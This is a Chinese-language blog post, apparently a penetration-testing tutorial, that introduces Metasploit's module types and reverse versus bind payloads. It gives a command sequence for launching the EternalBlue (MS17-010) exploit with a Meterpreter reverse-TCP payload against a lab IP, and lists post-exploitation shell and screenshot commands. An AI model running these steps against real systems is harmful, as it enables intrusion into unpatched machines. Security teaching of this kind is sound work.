<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Metasploit Framework | mrfan6ã®åšå®¢</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Metasploit Framework(MSF)ä½¿ç”¨æ–¹æ³•è¿›å…¥æ¡†æ¶ï¼šmsfconsole    ä½¿ç”¨searchå‘½ä»¤æŸ¥æ‰¾ç›¸å…³æ¼æ´ï¼šÂ searchÂ Â ms17-010    ä½¿ç”¨useè¿›å…¥æ¨¡å—:Â Â use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblueÂ  Â     ä½¿ç”¨infoæŸ¥çœ‹æ¨¡å—ä¿¡æ¯ï¼šÂ infoÂ     è®¾ç½®æ”»å‡»è½½è·ï¼šset payload windows&#x2F;x">
<meta property="og:type" content="article">
<meta property="og:title" content="Metasploit Framework">
<meta property="og:url" content="https://mrfan6.github.io/2022/04/02/msf/index.html">
<meta property="og:site_name" content="mrfan6ã®åšå®¢">
<meta property="og:description" content="Metasploit Framework(MSF)ä½¿ç”¨æ–¹æ³•è¿›å…¥æ¡†æ¶ï¼šmsfconsole    ä½¿ç”¨searchå‘½ä»¤æŸ¥æ‰¾ç›¸å…³æ¼æ´ï¼šÂ searchÂ Â ms17-010    ä½¿ç”¨useè¿›å…¥æ¨¡å—:Â Â use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblueÂ  Â     ä½¿ç”¨infoæŸ¥çœ‹æ¨¡å—ä¿¡æ¯ï¼šÂ infoÂ     è®¾ç½®æ”»å‡»è½½è·ï¼šset payload windows&#x2F;x">
<meta property="og:locale">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image1.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image2.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image3.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image4.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image5.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image6.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image7.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image8.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image9.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image10.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image11.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image12.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image13.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image14.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image15.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image16.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image17.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image18.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image19.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image20.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image21.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image22.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image23.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image24.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image25.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image26.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image27.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image28.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image29.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image30.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image31.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image32.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image33.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image34.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image35.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image36.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image37.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image38.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image39.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image40.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image41.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image42.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image43.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image44.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image45.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image46.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image47.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image48.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image49.png">
<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image50.png">
<meta property="article:published_time" content="2022-04-01T16:00:00.000Z">
<meta property="article:modified_time" content="2022-08-18T15:38:55.553Z">
<meta property="article:author" content="mrfan6">
<meta property="article:tag" content="tools">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image1.png">
  
    <link rel="alternative" href="/atom.xml" title="mrfan6ã®åšå®¢" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/favicon.png">
  
  
      
<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
  
  
      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  
  <!-- åŠ è½½ç‰¹æ•ˆ -->
    <script src="/js/pace.js"></script>
    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
  <script>
      var yiliaConfig = {
          rootUrl: '/',
          fancybox: true,
          animate: true,
          isHome: false,
          isPost: true,
          isArchive: false,
          isTag: false,
          isCategory: false,
          open_in_new: false
      }
  </script>
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            
            <img lazy-src="/img/head.jpg" class="js-avatar">
            
        </a>

        <hgroup>
          <h1 class="header-author"><a href="/" title="Hi Mate"></a></h1>
        </hgroup>

        
        
        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>èœå•</li>
                        <li>æ ‡ç­¾</li>
                        
                        <li>å‹æƒ…é“¾æ¥</li>
                        
                        
                        <li>å…³äºæˆ‘</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">åšå®¢é¦–é¡µ</a></li>
                        
                            <li><a href="/archives">æ‰€æœ‰æ–‡ç« </a></li>
                        
                            <li><a href="/HTML/index.html">ç«å½±å¿è€…</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fl mail" target="_blank" href="#" title="mail">mail</a>
                            
                                <a class="fl github" target="_blank" href="https://mrfan6.github.io/" title="github">github</a>
                            
                                <a class="fl zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
                            
                                <a class="fl QQ" target="_blank" href="#" title="QQ">QQ</a>
                            
                                <a class="fl wechat" target="_blank" href="#" title="wechat">wechat</a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 10px;">Webå®‰å…¨</a> <a href="/tags/tools/" style="font-size: 20px;">tools</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 10px;">ç¼–ç¨‹</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 15px;">é¶åœº</a> <a href="/tags/%E9%9D%B6%E6%9C%BA/" style="font-size: 10px;">é¶æœº</a>
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://mrfan6.github.io/">mrfan6</a>
                    
                    </div>
                </section>
                

                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">çˆ±è¿åŠ¨ã€å–œæ¬¢æ¥è§¦æ–°é²œäº‹ç‰©ã€è¿æ¥æ–°çš„æŒ‘æˆ˜ï¼Œæ›´çˆ±æ¸¸ç¦»äºé”™ç»¼å¤æ‚çš„ç¼–ç ä¸é€»è¾‘ä¸­</div>
                </section>
                
            </div>
        </div>
    </header>            
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me"></a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                
                    <img lazy-src="/img/head.jpg" class="js-avatar">
                
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="Me"></a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">åšå®¢é¦–é¡µ</a></li>
                
                    <li><a href="/archives">æ‰€æœ‰æ–‡ç« </a></li>
                
                    <li><a href="/HTML/index.html">ç«å½±å¿è€…</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                <div class="social">
                    
                        <a class="mail" target="_blank" href="#" title="mail">mail</a>
                    
                        <a class="github" target="_blank" href="https://mrfan6.github.io/" title="github">github</a>
                    
                        <a class="zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
                    
                        <a class="QQ" target="_blank" href="#" title="QQ">QQ</a>
                    
                        <a class="wechat" target="_blank" href="#" title="wechat">wechat</a>
                    
                </div>
            </nav>
        </header>                
    </div>
</nav>
      <div class="body-wrap"><article id="post-msf" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2022/04/02/msf/" class="article-date">
      <time datetime="2022-04-01T16:00:00.000Z" itemprop="datePublished">2022-04-02</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      Metasploit Framework
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        

        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
	<div class="article-entry" itemprop="articleBody">
	      
	        
	            
	        
	        
	        <h1 id="Metasploit-Framework-MSF"><a href="#Metasploit-Framework-MSF" class="headerlink" title="Metasploit Framework(MSF)"></a>Metasploit Framework(MSF)</h1><h2 id="ä½¿ç”¨æ–¹æ³•"><a href="#ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ä½¿ç”¨æ–¹æ³•"></a>ä½¿ç”¨æ–¹æ³•</h2><p>è¿›å…¥æ¡†æ¶ï¼šmsfconsole</p>
<ul>
<li><p>  ä½¿ç”¨searchå‘½ä»¤æŸ¥æ‰¾ç›¸å…³æ¼æ´ï¼šÂ searchÂ Â ms17-010</p>
</li>
<li><p>  ä½¿ç”¨useè¿›å…¥æ¨¡å—:Â Â use exploit/windows/smb/ms17_010_eternalblueÂ  Â </p>
</li>
<li><p>  ä½¿ç”¨infoæŸ¥çœ‹æ¨¡å—ä¿¡æ¯ï¼šÂ infoÂ </p>
</li>
<li><p>  è®¾ç½®æ”»å‡»è½½è·ï¼šset payload windows/x64/meterpreter/reverse_tcp</p>
</li>
<li><p>  æŸ¥çœ‹æ¨¡å—éœ€è¦é…ç½®çš„å‚æ•°ï¼šshow options</p>
</li>
<li><p>  è®¾ç½®å‚æ•°ï¼šsetÂ  RHOSTÂ  192.168.125.138</p>
</li>
<li><p>  æ”»å‡»ï¼šexploit / Â runÂ </p>
</li>
<li><p>  è¿”å›ä¸Šä¸€çº§ï¼šback</p>
</li>
<li><p>  å°†ä¼šè¯æ”¾åˆ°åå°ï¼šbackground</p>
</li>
<li><p>  åæ¸—é€é˜¶æ®µ</p>
</li>
</ul>
<p>åœ¨è·å–æƒé™åå¯ä»¥ä½¿ç”¨ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">screenshotÂ Â  Â Â Â #å¯¹ç›®æ ‡ä¸»æœºçš„å±å¹•è¿›è¡Œæˆªå›¾</span><br><span class="line">shellÂ Â  Â Â Â  Â Â Â  #ä»¥æ‰€æœ‰å¯ç”¨ä»¤ç‰Œæ¥è¿è¡Œä¸€ä¸ªäº¤äº’çš„shell</span><br></pre></td></tr></table></figure>

<h2 id="MSFçš„åŠŸèƒ½æ¨¡å—ä»‹ç»"><a href="#MSFçš„åŠŸèƒ½æ¨¡å—ä»‹ç»" class="headerlink" title="MSFçš„åŠŸèƒ½æ¨¡å—ä»‹ç»"></a>MSFçš„åŠŸèƒ½æ¨¡å—ä»‹ç»</h2><p>MSFæ‰€ç”¨åŠŸèƒ½ä¸»è¦å¯åˆ†ä¸ºè¿™å‡ ä¸ªæ¨¡å—ï¼Œæ¯ä¸ªæ¨¡å—éƒ½æœ‰å„è‡ªçš„åŠŸèƒ½é¢†åŸŸï¼Œå½¢æˆäº†æ¸—é€æµ‹è¯•çš„æµç¨‹</p>
<h3 id="Auxiliaries-è¾…åŠ©æ¨¡å—"><a href="#Auxiliaries-è¾…åŠ©æ¨¡å—" class="headerlink" title="Auxiliaries (è¾…åŠ©æ¨¡å—)"></a>Auxiliaries (è¾…åŠ©æ¨¡å—)</h3><p>è¯¥æ¨¡å—ä¸ä¼šç›´æ¥åœ¨æµ‹è¯•è€…å’Œç›®æ ‡ä¸»æœºä¹‹é—´å»ºç«‹è®¿é—®ï¼Œå®ƒä»¬åªè´Ÿè´£æ‰§è¡Œæ‰«æã€å—…æ¢ã€æŒ‡çº¹è¯†åˆ«ç­‰ç›¸å…³åŠŸèƒ½ä»¥è¾…åŠ©æ¸—é€æµ‹è¯•ã€‚</p>
<p>ç®€å•çš„è¯´å°±æ˜¯ä¸ºæ¸—é€æµ‹è¯•ä¿¡æ¯æœé›†æä¾›äº†å¤§é‡çš„è¾…åŠ©æ¨¡å—æ”¯æŒ</p>
<h3 id="Exploit-æ¼æ´åˆ©ç”¨æ¨¡å—æˆ–æ”»å‡»æ¨¡å—"><a href="#Exploit-æ¼æ´åˆ©ç”¨æ¨¡å—æˆ–æ”»å‡»æ¨¡å—" class="headerlink" title="Exploit (æ¼æ´åˆ©ç”¨æ¨¡å—æˆ–æ”»å‡»æ¨¡å—)"></a>Exploit (æ¼æ´åˆ©ç”¨æ¨¡å—æˆ–æ”»å‡»æ¨¡å—)</h3><p>æ¼æ´åˆ©ç”¨æ˜¯æŒ‡ç”±æ¸—é€æµ‹è¯•è€…åˆ©ç”¨ä¸€ä¸ªç³»ç»Ÿã€åº”ç”¨æˆ–è€…æœåŠ¡ä¸­çš„å®‰å…¨æ¼æ´è¿›è¡Œçš„æ”»å‡»è¡Œä¸ºã€‚æµè¡Œçš„æ¸—é€æ”»å‡»æŠ€æœ¯åŒ…æ‹¬ç¼“å†²åŒºæº¢å‡ºã€Webåº”ç”¨ç¨‹åºæ”»å‡»ï¼Œä»¥åŠåˆ©ç”¨é…ç½®é”™è¯¯ç­‰ï¼Œå…¶ä¸­åŒ…å«æ”»å‡»è€…æˆ–æµ‹è¯•äººå‘˜é’ˆå¯¹ç³»ç»Ÿä¸­çš„æ¼æ´è€Œè®¾è®¡çš„å„ç§POCéªŒè¯ç¨‹åºï¼Œç”¨äºç ´åç³»ç»Ÿå®‰å…¨æ€§çš„æ”»å‡»ä»£ç ï¼Œæ¯ä¸ªæ¼æ´éƒ½æœ‰ç›¸åº”çš„æ”»å‡»ä»£ç ã€‚</p>
<p>ç®€å•çš„è¯´å°±æ˜¯åˆ©ç”¨å‘ç°çš„å®‰å…¨æ¼æ´æˆ–é…ç½®å¼±ç‚¹å¯¹è¿œç¨‹ç›®æ ‡ç³»ç»Ÿè¿›è¡Œæ”»å‡»ï¼Œä»è€Œè·å¾—å¯¹è¿œç¨‹ç›®æ ‡ç³»ç»Ÿè®¿é—®æƒçš„ä»£ç ç»„ä»¶ã€‚</p>
<h3 id="Payload-æ”»å‡»è½½è·æ¨¡å—"><a href="#Payload-æ”»å‡»è½½è·æ¨¡å—" class="headerlink" title="Payload (æ”»å‡»è½½è·æ¨¡å—)"></a>Payload (æ”»å‡»è½½è·æ¨¡å—)</h3><p>Payloadä¸­åŒ…å«æ”»å‡»è¿›å…¥ç›®æ ‡ä¸»æœºåéœ€è¦åœ¨è¿œç¨‹ç³»ç»Ÿä¸­è¿è¡Œçš„æ¶æ„ä»£ç ï¼Œè€Œåœ¨Metasploitä¸­Payloadæ˜¯ä¸€ç§ç‰¹æ®Šæ¨¡å—ï¼Œå®ƒä»¬èƒ½å¤Ÿä»¥æ¼æ´åˆ©ç”¨æ¨¡å—è¿è¡Œï¼Œå¹¶èƒ½å¤Ÿåˆ©ç”¨ç›®æ ‡ç³»ç»Ÿä¸­çš„å®‰å…¨æ¼æ´å®æ–½æ”»å‡»ã€‚ç®€è€Œè¨€ä¹‹ï¼Œè¿™ç§æ¼æ´åˆ©ç”¨æ¨¡å—å¯ä»¥è®¿é—®ç›®æ ‡ç³»ç»Ÿï¼Œè€Œå…¶ä¸­çš„ä»£ç å®šä¹‰äº†Payloadåœ¨ç›®æ ‡ç³»ç»Ÿä¸­çš„è¡Œä¸º</p>
<p>ç®€å•çš„è¯´å°±æ˜¯æ”»å‡»æˆåŠŸåä¿ƒä½¿é¶æœºè¿è¡Œçš„ä¸€æ®µæ¤å…¥ä»£ç </p>
<p><strong>Shellcode</strong>Â ï¼šShellcodeæ˜¯payloadä¸­çš„ç²¾é«“éƒ¨åˆ†ï¼Œåœ¨æ¸—é€æ”»å‡»æ—¶ä½œä¸ºæ”»å‡»è½½è·è¿è¡Œçš„ä¸€ç»„æœºå™¨æŒ‡ä»¤ã€‚ç®€å•çš„è¯´å°±æ˜¯æ¼æ´åˆ©ç”¨ã€‚Shellcodeé€šå¸¸ç”¨æ±‡ç¼–è¯­è¨€ç¼–å†™ã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œç›®æ ‡ç³»ç»Ÿæ‰§è¡Œäº†shellcodeè¿™ä¸€ç»„æŒ‡ä»¤<br>ä¹‹åï¼Œæ‰ä¼šæä¾›ä¸€ä¸ªå‘½ä»¤è¡Œshellã€‚</p>
<h4 id="Metasploitä¸­çš„-Payload-æ¨¡å—ä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ç§ç±»å‹ï¼š"><a href="#Metasploitä¸­çš„-Payload-æ¨¡å—ä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ç§ç±»å‹ï¼š" class="headerlink" title="Metasploitä¸­çš„ Payload æ¨¡å—ä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ç§ç±»å‹ï¼š"></a>Metasploitä¸­çš„ Payload æ¨¡å—ä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ç§ç±»å‹ï¼š</h4><ul>
<li>  <strong>-Single</strong></li>
<li>  <strong>-Stager</strong></li>
<li>  <strong>-Stage</strong></li>
</ul>
<ul>
<li><p>Singleæ˜¯ä¸€ç§å®Œå…¨ç‹¬ç«‹çš„Payloadï¼Œè€Œä¸”ä½¿ç”¨èµ·æ¥å°±åƒè¿è¡Œ calc.exeä¸€æ ·ç®€å•ï¼Œä¾‹å¦‚æ·»åŠ ä¸€ä¸ªç³»ç»Ÿç”¨æˆ·æˆ–åˆ é™¤ä¸€ä»½æ–‡ä»¶ã€‚ç”±äºSingle Payloadæ˜¯å®Œå…¨ç‹¬ç«‹çš„ï¼Œå› æ­¤å®ƒä»¬æœ‰å¯èƒ½ä¼šè¢«ç±»ä¼¼ netcatè¿™æ ·çš„émetasploitå¤„ç†å·¥å…·æ‰€æ•æ‰åˆ°ã€‚</p>
</li>
<li><p>Stagerè¿™ç§Payloadè´Ÿè´£å»ºç«‹ç›®æ ‡ç”¨æˆ·ä¸æ”»å‡»è€…ä¹‹é—´çš„ç½‘ç»œè¿æ¥ï¼Œå¹¶ä¸‹è½½é¢å¤–çš„ç»„ä»¶æˆ–åº”ç”¨ç¨‹åºã€‚ä¸€ç§å¸¸è§çš„Stager Payloadå°±æ˜¯reverse_tcpï¼Œå®ƒå¯ä»¥è®©ç›®æ ‡ç³»ç»Ÿä¸æ”»å‡»è€…å»ºç«‹ä¸€æ¡tcpè¿æ¥ï¼Œè®©ç›®æ ‡ç³»ç»Ÿä¸»åŠ¨è¿æ¥æˆ‘ä»¬çš„ç«¯å£(åå‘è¿æ¥)ã€‚å¦ä¸€ç§å¸¸è§çš„æ˜¯bind_tcpï¼Œå®ƒå¯ä»¥è®©ç›®æ ‡ç³»ç»Ÿå¼€å¯ä¸€ä¸ªtcpç›‘å¬å™¨ï¼Œè€Œæ”»å‡»è€…éšæ—¶å¯ä»¥ä¸ç›®æ ‡ç³»ç»Ÿè¿›è¡Œé€šä¿¡(æ­£å‘è¿æ¥)ã€‚</p>
</li>
<li><p>Stageæ˜¯Stager Payloadä¸‹çš„ä¸€ç§Payloadç»„ä»¶ï¼Œè¿™ç§Payloadå¯ä»¥æä¾›æ›´åŠ é«˜çº§çš„åŠŸèƒ½ï¼Œè€Œä¸”æ²¡æœ‰å¤§å°é™åˆ¶</p>
</li>
</ul>
<p><strong>åœ¨ Metasploitä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡Payloadçš„åç§°å’Œä½¿ç”¨æ ¼å¼æ¥æ¨æ–­å®ƒçš„ç±»å‹ï¼š</strong></p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image1.png"></p>
<p><strong>åœ¨ Metasploitä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡Payloadçš„åç§°å’Œä½¿ç”¨æ ¼å¼æ¥æ¨æ–­å®ƒçš„ç±»å‹ï¼š</strong></p>
<p><strong>å½“æˆ‘ä»¬åœ¨Metasploitä¸­æ‰§è¡Œ showÂ  payloadså‘½ä»¤ä¹‹åï¼Œå®ƒä¼šç»™æˆ‘ä»¬æ˜¾ç¤ºä¸€ä¸ªå¯ä½¿ç”¨çš„Payloadåˆ—è¡¨ï¼š</strong></p>
<p><strong>åœ¨è¿™ä¸ªåˆ—è¡¨ä¸­ï¼Œåƒ windows/powershell_bind_tcp å°±æ˜¯ä¸€ä¸ªSingle<br>Payloadï¼Œå®ƒä¸åŒ…å«Stage Payload</strong></p>
<p><strong>è€Œ windows/meterpreter/reverse_tcp åˆ™ç”±ä¸€ä¸ªStage Payloadï¼ˆmeterpreterï¼‰å’Œ ä¸€ä¸ªStager Payloadï¼ˆreverse_tcpï¼‰ç»„æˆ</strong></p>
<p><strong>Stagerä¸­å‡ ç§å¸¸è§çš„payload</strong></p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image2.png"></p>
<p><strong>æ­£å‘è¿æ¥</strong>ä½¿ç”¨åœºæ™¯ï¼šæˆ‘ä»¬çš„æ”»å‡»æœºåœ¨å¤–ç½‘ç¯å¢ƒï¼Œè¢«æ”»å‡»æœºæ˜¯å†…ç½‘ç¯å¢ƒï¼Œç”±äºè¢«æ”»å‡»æœºæ— æ³•ä¸»åŠ¨è¿æ¥åˆ°æˆ‘ä»¬çš„ä¸»æœºï¼Œæ‰€ä»¥å°±å¿…é¡»æˆ‘ä»¬ä¸»åŠ¨è¿æ¥è¢«æ”»å‡»æœºäº†ã€‚ä½†æ˜¯è¿™é‡Œç»å¸¸é‡åˆ°çš„é—®é¢˜æ˜¯ï¼Œè¢«æ”»å‡»æœºä¸Šå¼€äº†é˜²ç«å¢™ï¼Œåªå…è®¸è®¿é—®æŒ‡å®šçš„ç«¯å£ï¼Œæ¯”å¦‚è¢«æ”»å‡»æœºåªå¯¹å¤–å¼€æ”¾äº†80ç«¯å£ã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬å°±åªèƒ½è®¾ç½®æ­£å‘è¿æ¥80ç«¯å£äº†ï¼Œè¿™é‡Œå¾ˆæœ‰å¯èƒ½å¤±è´¥ï¼Œå› ä¸º80ç«¯å£ä¸Šçš„æµé‡å¤ªå¤šäº†</p>
<p><strong>windows/meterpreter/bind_tcp #æ­£å‘è¿æ¥</strong></p>
<p><strong>åå‘è¿æ¥</strong>ä½¿ç”¨åœºæ™¯ï¼šæˆ‘ä»¬çš„ä¸»æœºå’Œè¢«æ”»å‡»æœºéƒ½æ˜¯åœ¨å¤–ç½‘æˆ–è€…éƒ½æ˜¯åœ¨å†…ç½‘ï¼Œè¿™æ ·è¢«æ”»å‡»æœºå°±èƒ½ä¸»åŠ¨è¿æ¥åˆ°æˆ‘ä»¬çš„ä¸»æœºäº†ã€‚å¦‚æœæ˜¯è¿™æ ·çš„æƒ…å†µï¼Œå»ºè®®ä½¿ç”¨åå‘è¿æ¥ï¼Œå› ä¸ºåå‘è¿æ¥çš„è¯ï¼Œå³ä½¿è¢«æ”»å‡»æœºå¼€äº†é˜²ç«å¢™ä¹Ÿæ²¡äº‹ï¼Œé˜²ç«å¢™åªæ˜¯é˜»æ­¢è¿›å…¥è¢«æ”»å‡»æœºçš„æµé‡ï¼Œè€Œä¸ä¼šé˜»æ­¢è¢«æ”»å‡»æœºä¸»åŠ¨å‘å¤–è¿æ¥çš„æµé‡ã€‚</p>
<p><strong>windows/meterpreter/reverse_tcp #åå‘è¿æ¥ï¼Œå¸¸ç”¨</strong></p>
<p><strong>åå‘è¿æ¥</strong>80å’Œ443ç«¯å£ä½¿ç”¨åœºæ™¯ï¼šè¢«æ”»å‡»æœºèƒ½ä¸»åŠ¨è¿æ¥åˆ°æˆ‘ä»¬çš„ä¸»æœºï¼Œè¿˜æœ‰å°±æ˜¯è¢«æ”»å‡»æœºçš„é˜²ç«å¢™è®¾ç½®çš„ç‰¹åˆ«ä¸¥æ ¼ï¼Œå°±è¿è¢«æ”»å‡»æœºè®¿é—®å¤–éƒ¨ç½‘ç»œçš„æµé‡ä¹Ÿè¿›è¡Œäº†ä¸¥æ ¼çš„é™åˆ¶ï¼Œåªå…è®¸è¢«æ”»å‡»æœºçš„80ç«¯å£æˆ–443ç«¯å£ä¸å¤–éƒ¨é€šä¿¡</p>
<h3 id="Post-åæœŸæ¸—é€æ¨¡å—"><a href="#Post-åæœŸæ¸—é€æ¨¡å—" class="headerlink" title="Post (åæœŸæ¸—é€æ¨¡å—)"></a>Post (åæœŸæ¸—é€æ¨¡å—)</h3><p>è¯¥æ¨¡å—ä¸»è¦ç”¨äºåœ¨å–å¾—ç›®æ ‡ç³»ç»Ÿè¿œç¨‹æ§åˆ¶æƒåï¼Œè¿›è¡Œä¸€ç³»åˆ—çš„åæ¸—é€æ”»å‡»åŠ¨ä½œï¼Œå¦‚è·å–æ•æ„Ÿä¿¡æ¯ã€å®æ–½è·³æ¿æ”»å‡»ç­‰ã€‚</p>
